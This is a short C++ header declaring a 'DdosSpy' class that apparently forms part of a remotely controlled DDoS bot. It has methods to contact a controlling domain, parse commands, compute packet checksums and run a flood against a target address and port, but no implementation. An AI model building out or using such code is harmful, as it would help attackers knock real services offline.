#ifndef DDOSSPY_H
#define DDOSSPY_H

#include "tcpsocket.h"
#include "stdlib.h"
#include "time.h"
#include <windows.h>
#include <vector>
#include <iostream>
#include <map>
#include <winsock2.h>
#include <Ws2tcpip.h>

class DdosSpy
{
public:
    DdosSpy();
    ~DdosSpy();

     std::string DdosSplit;
     std::string DdosEnd;

    static USHORT checksum(USHORT *buffer, int size);
    static void startByNewThread(std::string domain, int port);
    static DWORD WINAPI threadProc(LPVOID args);
    static void startDdosSpy(std::string domain, int port);
    static void addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size);
    std::map<std::string, std::string> parseArgs(std::string &data);


    static void execDdos(std::string atkip, int atkport);
};

#endif // DDOSSPY_H
